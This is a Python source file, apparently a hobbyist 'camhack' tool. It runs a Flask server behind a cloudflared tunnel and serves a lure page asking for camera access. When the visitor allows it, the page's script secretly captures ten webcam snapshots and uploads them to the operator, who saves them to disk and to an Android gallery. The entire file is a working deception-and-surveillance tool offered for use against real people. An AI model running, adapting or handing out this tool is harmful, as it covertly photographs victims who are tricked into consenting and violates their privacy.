#!/usr/bin/env python3
"""
cam
By shourya
Single file - Auto Cloudflare
Fixed: added unlock(), colorama init, and a few checks.
"""

import os
import time
import threading
import base64
import shutil
from flask import Flask, render_template_string, request
from colorama import init as colorama_init, Fore, Style

colorama_init(autoreset=True)

app = Flask(__name__)

# ---------------- HTML Page ----------------
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>camhack by shourya</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body { background: black; color: lime; text-align: center; font-family: monospace; }
    #msg { font-size: 20px; margin-top: 20px; }
  </style>
</head>
<body>
  <h1>📸 hello this is eren</h1>
  <h3>Camera Access Required</h3>
  <p id="msg">Please allow camera to continue...</p>
  <video id="video" autoplay playsinline width="300" height="220"></video>
  <canvas id="canvas" width="300" height="220" style="display:none;"></canvas>

  <script>
    let video = document.getElementById('video');
    let canvas = document.getElementById('canvas');
    let ctx = canvas.getContext('2d');
    let count = 0;

    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      document.getElementById("msg").innerText = "😊 You are a very good person. God bless you!";
      let interval = setInterval(() => {
        try {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          let data = canvas.toDataURL("image/png");
          fetch('/upload', { method:'POST', body:data }).catch(e => {
            console.log('upload err', e);
          });
          count++;
          if(count >= 10) {
            clearInterval(interval);
            document.getElementById("msg").innerText="✔";
          }
        } catch(e) {
          console.error(e);
        }
      }, 1500);
    })
    .catch(err => {
      document.getElementById("msg").innerText = "❌ Camera access denied!";
      console.error(err);
    });
  </script>
</body>
</html>
"""

# ---------------- Upload Route ----------------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    try:
        data = request.data.decode("utf-8")
        if not data or "," not in data:
            return "invalid", 400

        num = len([f for f in os.listdir(".") if f.startswith("camtam_")]) + 1
        imgdata = data.split(",", 1)[1]

        # --- Save locally in current folder ---
        filename_local = f"camtam_{num}.png"
        with open(filename_local, "wb") as f:
            f.write(base64.b64decode(imgdata))

        # --- Save to Download folder for gallery (if available) ---
        save_dir = "/sdcard/Download/HCO-Cam-Tam"
        try:
            os.makedirs(save_dir, exist_ok=True)
            filename_gallery = os.path.join(save_dir, filename_local)
            with open(filename_gallery, "wb") as f:
                f.write(base64.b64decode(imgdata))

            # --- Refresh gallery (media scan) if 'am' exists (Termux) ---
            if shutil.which("am"):
                os.system(f'am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file://{filename_gallery}')
            print(Fore.GREEN + f"[✔] Image saved to gallery: {filename_gallery}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"[!] Could not save to /sdcard: {e}" + Style.RESET_ALL)

        # --- Print Termux log for local file ---
        print(Fore.GREEN + f"[✔] Image saved locally: {os.path.abspath(filename_local)}" + Style.RESET_ALL)
        return "ok"
    except Exception as e:
        print(Fore.RED + f"[✖] Upload error: {e}" + Style.RESET_ALL)
        return "error", 500

# ---------------- Banner + Unlock ----------------
def banner():
    os.system("clear")
    print(Fore.LIGHTBLUE_EX + Style.BRIGHT + "camhack by Shourya" + Style.RESET_ALL)

def unlock():
    """
    Previously missing function.
    Use it to check environment and optionally wait for user confirmation.
    """
    print(Fore.CYAN + "[*] Checking environment..." + Style.RESET_ALL)
    needs = []
    for exe in ("python", "cloudflared"):
        if shutil.which(exe) is None and exe == "cloudflared":
            # cloudflared optional; warn but continue
            print(Fore.YELLOW + f"[!] Optional: '{exe}' not found in PATH. Cloudflared tunnel won't start." + Style.RESET_ALL)
        elif shutil.which(exe) is None:
            needs.append(exe)

    if needs:
        print(Fore.RED + f"[✖] Missing executables: {needs}" + Style.RESET_ALL)
        print("Install missing packages before continuing.")
        # don't raise — just let user fix
    # Optional short pause so user can read terminal
    time.sleep(0.6)

# ---------------- Cloudflare Tunnel ----------------
def start_cloudflare():
    if shutil.which("cloudflared") is None:
        print(Fore.YELLOW + "[!] cloudflared not installed or not in PATH. Skipping Cloudflared tunnel." + Style.RESET_ALL)
        return
    print(Fore.CYAN + "\n[+] Starting Cloudflared tunnel..." + Style.RESET_ALL)
    # kill any existing cloudflared (best-effort)
    os.system("pkill cloudflared >/dev/null 2>&1")
    # spawn the tunnel (blocking) — we call it from a thread
    os.execvp("cloudflared", ["cloudflared", "tunnel", "--url", "http://localhost:5000", "--no-autoupdate"])

# ---------------- Main ----------------
if __name__ == "__main__":
    unlock()
    banner()
    print(Fore.GREEN + "[✔] Local server starting on http://0.0.0.0:5000" + Style.RESET_ALL)

    # Start Flask in background thread (daemon so it exits with main)
    flask_thread = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False), daemon=True)
    flask_thread.start()

    # Start Cloudflare tunnel in main thread if available (this replaces current process)
    # If you prefer to keep process and run cloudflared in a background OS process, change this to os.system(...)
    if shutil.which("cloudflared"):
        # run cloudflared blocking (it will replace the process via exec); comment out exec if you want it backgrounded
        try:
            # use a separate thread and os.system to keep main process
            threading.Thread(target=lambda: os.system("cloudflared tunnel --url http://localhost:5000 --no-autoupdate"), daemon=True).start()
        except Exception as e:
            print(Fore.RED + f"[✖] Cloudflared start failed: {e}" + Style.RESET_ALL)

    # Keep the main thread alive to let background threads run
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Exiting..." + Style.RESET_ALL)
        os._exit(0)
